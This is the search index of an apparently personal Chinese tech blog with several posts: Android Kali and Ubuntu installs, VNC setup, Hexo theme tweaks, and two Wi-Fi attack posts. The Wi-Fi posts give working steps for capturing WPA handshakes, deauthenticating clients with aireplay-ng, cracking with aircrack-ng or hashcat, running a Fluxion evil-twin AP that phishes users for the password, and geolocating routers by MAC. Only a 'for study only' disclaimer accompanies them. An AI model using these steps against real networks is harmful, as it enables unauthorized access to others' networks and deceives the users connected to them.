    <content type="text"><![CDATA[学习小结 免责声明:以下内容仅供学习参考 跑包GUP跑包转换格式使用hashcat密码破解,首先使用工具将cap转换成hccapx方法一：在线转换网站方法二：下载工具工具下载：下载下载完成后进入src目录编译cap2hccapx.c gcc cap2hccapx.c -o cap2hccapx 转换文件 ./cap2hccapx input.pcap output.hccapx 解密方法一：使用naive-hashcat解密，我的垃圾电脑跑不了，这个只是了解参考。项目地址 方法二:在线解密 这个需要支付BTC:穷，玩不起，没使用 这个可以免费跑2千万个密码:结果会发送到填写的邮箱 欺骗用户设备一台PC–kali系统 一个usb无线网卡–RT3070 两台手机–一台开热点一台模拟合法用户 软件下载最新版本 git clone https://github.com/FluxionNetwork/fluxion.git 我使用的是3.10版本的，在项目地址自行下载 运行 cd fluxion sudo ./fluxion.sh 按照提示进行使用，可参考[sevge博客]的fluxion一文，其实在项目的网站说明了需要使用外置的usb网卡我一开始是使用的内置无线网卡，使用程序一直卡在创建AP处。后来请教sevge大佬，解决了这个问题 问题我使用的V3.10存在不管密码是否正确，程序都会结束wifi干扰 结果获得正确的密码 社会工程学定位使用路由器mac地址来定位地址，查询网站。测试效果精确 参考文章Wifi小结-github 关于定位的文章 fluxion使用文章]]></content>
      <categories>
        <category>无线学习</category>
      </categories>
      <tags>
        <tag>无线安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安卓手机安装kali(2)]]></title>
    <url>%2F%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%AE%89%E8%A3%85kali-2%2F</url>
    <content type="text"><![CDATA[使用VNC前面已经安装好了kali，接下来是看看图形化界面了。 安卓手机由于我的安卓版本比较低，使用不了网上博文中提供VNC viewer,安卓4.4+使用的VNC viewer,该地址还提供其他系统的版本我的垃圾手机是没有这个福利了，只好找其他替代软件了，经过几番查找找到了一个140多k的软件 kali电脑下载VNC viewer apt-get install tigervnc-viewer 运行 viewer 安装中文库使用ssh连接手机后root执行下面的命令 apt-get install xfonts-intl-chinese apt-get install ttf-wqy-microhei 启动VNC服务端执行命令 vncserver 返回结果123New &apos;X&apos; desktop is localhost:1Starting applications specified in /home/android/.vnc/xstartupLog file is /home/android/.vnc/localhost:1.log 证明vncserver已启动成功因为刚刚终端返回的信息:New ‘X’ desktop is localhost:1指定了此次桌面会话号为1，所以端口就为5900+1=5901。如果我们开启了多个虚拟桌面，它们的会话号为2,3,4…，那么各自的端口即为5902,5903,5904…依次类推。 问题停止Linux系统再启动Linux系统后，再次执行vncserver命令会出现报错解决办法：12rm -rf /tmp/.X[1-9]-lockrm -rf /tmp/.X11-unix/X[1-9] 分辨率vncserver默认的分辨率是1024×768手机屏幕的分辨率都是720P(1280×720)，1080P(1920×1080)，甚至2K(2560×1440)启动vncserver时，执行： vncserver -geometry 1280x720 命令中的1280x720里的x是小写字母x 自动更改分辨率 vim ~/.bashrc #编辑~/.bashrcalias vncserver=’vncserver -geometry 1280x720’ 参考文章美丽应用安装vncserver]]></content>
      <categories>
        <category>linux学习</category>
      </categories>
      <tags>
        <tag>玩手机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安卓手机安装kali]]></title>
    <url>%2F%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%AE%89%E8%A3%85kali%2F</url>
    <content type="text"><![CDATA[前提安装好了前面ubuntu那篇文章中的三个软件 添加源我使用的是中科大的源 http://mirrors.ustc.edu.cn/kali/ 源的格式 中科大 - http://mirrors.ustc.edu.cn/+Linux&#39;s Name/ 阿里云 - http://mirrors.aliyun.com/+Linux&#39;s Name/ 问题获取管理员权限sudo出现问题12sudo: PERM_ROOT: setresuid(0, -1, -1): 权限不够sudo: 无法初始化策略插件 相关问题，参考文章-github地址网传解决方法是把用户名设为root然后再重新配置，这个方法没有解决我的问题，还导致我不能登录设备 最后我先用普通用户ssh登录，然后su，默认密码是toor。这样也能获取管理员权限 推荐阅读基础文章进阶文章 可继续学习博客 小结之前在学校捣腾了一下午，失败告终，今日再度从0开始学习总算成功了。]]></content>
      <categories>
        <category>linux学习</category>
      </categories>
      <tags>
        <tag>玩手机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安卓手机安装ubuntu]]></title>
    <url>%2F%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%AE%89%E8%A3%85ubuntu%2F</url>
    <content type="text"><![CDATA[工具一台安卓4.2的手机 将手机ROOT，ROOT工具一键ROOT ROOT工具下载 一台电脑 软件Linux系统支撑软件:Linux deploy Linux deploy支撑软件:Busy Box 手机端SSH连接软件:ConnectBox 我参考了一篇17年的安卓4.1文章，为保险起见我安装的是17年的Linux deploy 安装首先安装的是Busy Box Busy Box默认界面语言是英文，可以改成中文，点击右上角部分，在弹出的菜单中选择Settings，接着进入设置界面，找到Language项，点击后选择简体中文 点击安装，等待程序自行运行，在界面中输出## END后退出程序 安装运行Linux deploy 点击左上角选择设置找到PATH变量，赋予其值 /system/xbin 这里的路径是Busy Box的安装路径 先移除环境再更新环境 选择锁定WIFI 防止下载掉线 退回主界面，点击右下角部分,文中没有的为默认的，配置如下： 123456789属性:linuxContainerization method (chroot)发行版（Ubuntu）架构（armhf）发行版版本（xenial）源地址 （http://mirrors.ustc.edu.cn/ubuntu-ports）安装类型（文件）安装路径（$&#123;ENV_DIR&#125;/linux.img）本地化（zh_CN.UTF-8） 安装路径是Linux系统的安装路径，如要安装在手机自带的存储空间中，则在路径开头加上${ENV_DIR}，这代表的是存储空间根目录。如要安装在sdcard中，则加上${EXTERNAL_STORAGE}。 用户名和密码自定义，本地、远程连接该系统用。 INIT 选择Enable MOUNTS 选择Enable (挂载功能可让Linux系统访问手机上的文件挂载列表中添加访问手机内容的目录，/sdcard:sdcard为手机自带存储空间根目录，/storage/sdcard1为sd卡根目录。) SSH 选择Enable 图形界面 选择Enable (桌面环境选择Xfce) 退出系统设置界面，点击主界面右上角，选择安装。&lt;&lt;&lt;deploy则安装完毕。没有报错则安装成功。注意：安装完毕后要先点击停止按钮，再按启动按钮 安装ConnectBot 点击右上角 +号创建 输入用户名，主机输入localhost 点击右上角 +号保存信息，主界面会多出来添加的选项，点击进行SSH连接 效果ss连接上后 总结整个安装过程不太顺利，需要多次调试。强烈推荐中科大的源安装速度快好用得很 参考文章首先参考文章图形化界面操作文章中科大源]]></content>
      <categories>
        <category>linux学习</category>
      </categories>
      <tags>
        <tag>玩手机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[添加页面标题欺骗]]></title>
    <url>%2F%E6%B7%BB%E5%8A%A0%E9%A1%B5%E9%9D%A2%E6%A0%87%E9%A2%98%E6%AC%BA%E9%AA%97%2F</url>
    <content type="text"><![CDATA[效果离开网页，标题出现一行文字重新回到网页，标题又显示另一行文字 代码在next\source\js\src文件夹下创建crash_cheat.js，代码如下：1234567891011121314151617&lt;!--崩溃欺骗--&gt; var OriginTitle = document.title; var titleTime; document.addEventListener(&apos;visibilitychange&apos;, function () &#123; if (document.hidden) &#123; $(&apos;[rel=&quot;icon&quot;]&apos;).attr(&apos;href&apos;, &quot;/images/panda16.icon&quot;); document.title = &apos;页面崩溃点击恢复&apos;; clearTimeout(titleTime); &#125; else &#123; $(&apos;[rel=&quot;icon&quot;]&apos;).attr(&apos;href&apos;, &quot;/images/panda16.icon&quot;); document.title = &apos;页面修复成功&apos; ; titleTime = setTimeout(function () &#123; document.title = OriginTitle; &#125;, 2000); &#125; &#125;); 引用代码在next\layout_layout.swig文件中，添加引用（注：在/body前即可）：12&lt;!--崩溃欺骗--&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/crash_cheat.js&quot;&gt;&lt;/script&gt; 参考文章asdfv1929的博客]]></content>
      <categories>
        <category>WEB学习</category>
      </categories>
      <tags>
        <tag>hexo倒腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[next主题添加音乐播放器]]></title>
    <url>%2Fnext%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E9%9F%B3%E4%B9%90%2F</url>
    <content type="text"><![CDATA[添加APlayer播放器原由之前把播放器嵌在站点概览里，在手机端显示不了导致不能停止音乐 下载项目地址下载解压后将dist文件夹复制到themes\next\source文件夹下 安装在themes\next\source\dist文件夹下创建music.js文件12345678910111213141516171819202122232425262728const ap = new APlayer(&#123; container: document.getElementById(&apos;aplayer&apos;), fixed: true, //吸底模式 autoplay: true, //自动播放 theme: &apos;#FADFA3&apos;, //主题色 loop: &apos;all&apos;, //音频循环播放, 可选值: &apos;all&apos;全部循环, &apos;one&apos;单曲循环, &apos;none&apos;不循环 order: &apos;random&apos;, //音频循环顺序, 可选值: &apos;list&apos;列表循环, &apos;random&apos;随机循环 preload: &apos;auto&apos;, //预加载，可选值: &apos;none&apos;, &apos;metadata&apos;, &apos;auto&apos; volume: 0.7, //默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效 mutex: true, //互斥，阻止多个播放器同时播放，当前播放器播放时暂停其他播放器 listFolded: false, //列表默认折叠 listMaxHeight: 90, //列表最大高度 lrcType: 0, //歌词传递方式 audio: [ &#123; name: &quot;思念是一种病&quot;, artist: &apos;张震岳 / 蔡健雅&apos;, url: &apos;http://www.ytmp3.cn/down/50020.mp3&apos;, cover: &apos;http://p2.music.126.net/N61oLy0iLfEkZTHD2j87iA==/18693896697392706.jpg?param=130y130&apos;, &#125;, &#123; name: &quot;这就是爱情&quot;, artist: &apos;李代沫&apos;, url: &apos;http://www.ytmp3.cn/down/54477.mp3&apos;, cover: &apos;http://p1.music.126.net/RQBF9kqZb7PtLCaOxi9ngQ==/109951163053984533.jpg?param=130y130&apos;, &#125;, ]&#125;); 源码中的参数可以参考官方文档 audio对应的便是音频文件，在里面添加音乐 音乐的外链可以去下面的网站搜索复制音乐图片我是在网易云里搜索同一首歌曲找到的 运行程序打开themes\next\layout_layout.swig文件，将下述程序添加添加到&lt; body itemscope … &gt;后面就行，即在&lt; body &gt;&lt; /body &gt;里面1234&lt;link rel=&quot;stylesheet&quot; href=&quot;/dist/APlayer.min.css&quot;&gt;&lt;div id=&quot;aplayer&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/dist/APlayer.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/dist/music.js&quot;&gt;&lt;/script&gt; 音乐外链音乐网站1:www.ytmp3.cn 音乐网站2:www.170hi.com]]></content>
      <categories>
        <category>WEB学习</category>
      </categories>
      <tags>
        <tag>hexo倒腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo代码复制]]></title>
    <url>%2Fhexo%E4%BB%A3%E7%A0%81%E5%A4%8D%E5%88%B6%2F</url>
    <content type="text"><![CDATA[hexo-next添加代码块复制功能clipboard.js下载项目地址详细内容可以前往查看，如是只需实现功能即可右键下载。将clipboard.js保存到theme/next/source/js/src下 使用在theme/next/source/js/src下创建clipboard-use.js文件代码如下 1234567891011121314151617/*页面载入完成后，创建复制按钮*/!function (e, t, a) &#123; /* code */ var initCopyCode = function()&#123; var copyHtml = &apos;&apos;; copyHtml += &apos;&lt;button class=&quot;btn-copy&quot; data-clipboard-snippet=&quot;&quot;&gt;&apos;; copyHtml += &apos;&lt;span&gt;复制&lt;/span&gt;&apos;; copyHtml += &apos;&lt;/button&gt;&apos;; $(&quot;.highlight .code pre&quot;).before(copyHtml); new ClipboardJS(&apos;.btn-copy&apos;, &#123; target: function(trigger) &#123; return trigger.nextElementSibling; &#125; &#125;); &#125; initCopyCode();&#125;(window, document); 在theme/next/source/css/_custom/custom.styl样式中添加如下代码：123456789101112131415161718192021222324252627282930313233343536//代码块复制按钮.highlight&#123; //方便copy代码按钮（btn-copy）的定位 position: relative;&#125;.btn-copy &#123; display: inline-block; cursor: pointer; background-color: #eee; background-image: linear-gradient(#fcfcfc,#eee); border: 1px solid #d5d5d5; border-radius: 3px; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; -webkit-appearance: none; font-size: 13px; font-weight: 700; line-height: 20px; color: #333; -webkit-transition: opacity .3s ease-in-out; -o-transition: opacity .3s ease-in-out; transition: opacity .3s ease-in-out; padding: 2px 6px; position: absolute; right: 5px; top: 5px; opacity: 0;&#125;.btn-copy span &#123; margin-left: 5px;&#125;.highlight:hover .btn-copy&#123; opacity: 1;&#125; 引用在themes/next/layout/_layout.swig文件中引用（/body）之前添加：123&lt;!-- 代码块复制功能 --&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clipboard.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clipboard-use.js&quot;&gt;&lt;/script&gt;]]></content>
      <categories>
        <category>WEB学习</category>
      </categories>
      <tags>
        <tag>hexo倒腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali软件小技巧]]></title>
    <url>%2Fkali%E5%BA%94%E7%94%A8%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[kali应用总结卸载软件删除配置 apt-get purge XXXX 安装截图软件下载安装python-xlib apt-get install python-xlib 下载安装截图软件包 wget http://packages.linuxdeepin.com/deepin/pool/main/d/deepin-scrot/deepin-scrot_2.0-0deepin_all.deb 安装软件包 dpkg -i deepin-scrot* 运气比较好，安装没有报错。据说如果报错啥的可能需要安装依赖，可以通过强制执行安装依赖命令解决问题 报错了参考下面的方法 强制安装依赖包 apt-get -f install 重新安装截图软件包 sudo dpkg -i deepin-scrot* 如果顺利的话 此时应该执行deepin-scrot就可截图了 设置快捷键在设置页面自定义快捷件，由于用QQ截图习惯了，我设置的Ctrl+Alt+A]]></content>
      <categories>
        <category>linux学习</category>
      </categories>
      <tags>
        <tag>kali软件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo-admin插件]]></title>
    <url>%2Fhexo-admin%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[hexo倒腾系列 原由近几天将hexo的next主题倒腾差不多了，开始尝试着写博客了，听说用hexo-admin插件编辑文章还是挺方便的 安装进入hexo源文件目录，执行命令： npm install –save hexo-admin 配置编辑根目录下：_config.yml文件，添加：1234admin: username: myfavoritename password_hash: be121740bf988b2225a313fa1f107ca1 secret: a secret something 其中：username为登录的用户名，password_hash为密码的bcrypt哈希值，secret用于使cookie安全,可以尽可能复杂。 生成password_hash方法 安装模块：sudo npm install bcrypt-nodejs 执行：123$ node&gt;const bcrypt = require(&apos;bcrypt-nodejs&apos;)&gt; bcrypt.hashSync(&apos;your_password&apos;) #your_password为登录密码。 参考博客]]></content>
      <categories>
        <category>WEB学习</category>
      </categories>
      <tags>
        <tag>hexo倒腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wi-Fi密码破解]]></title>
    <url>%2FWi-Fi%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98%2F</url>
    <content type="text"><![CDATA[仅供学习参考 总结 wifi密码破解将WLAN0网卡开启混杂模式 airmon-ng start wlan0 ##提示要杀掉一些进程 airmon-ng check kill airmon-ng start wlan0 1、查看附近Wi-Fi airodump-ng wlan0mon 2、进行握手包监听与获取 airodump-ng -c 通道值 —bssid wifi的mac值 -w cap文件名 wlan0mon ##其中wlan0mon是启动混杂模式的网卡名 3、断网抓取握手包（另开一个窗口） aireplay-ng -0 20 -c 客户机mac值 -a wifi热点mac值 wlan0mon #-0 death模式 20为发送次数 4、跑包 aircrack-ng -w 字典 包名 关闭混杂模式 airmon-ng stop wlan0mon 启动网络 service network-manager start ——————————分割线——————————— 构造同名的虚假AP airbase-ng —essid wifi名 -c 6 -Z 4 wlan0mon -c 代表channel信道 -Z代表WPA2加密 -z代表WPA1加密 z后面的参数1～5分别表示WEP40、TKIP、WRAP、CCMP、WEP104]]></content>
      <categories>
        <category>无线学习</category>
      </categories>
      <tags>
        <tag>无线安全</tag>
      </tags>
  </entry>
</search>
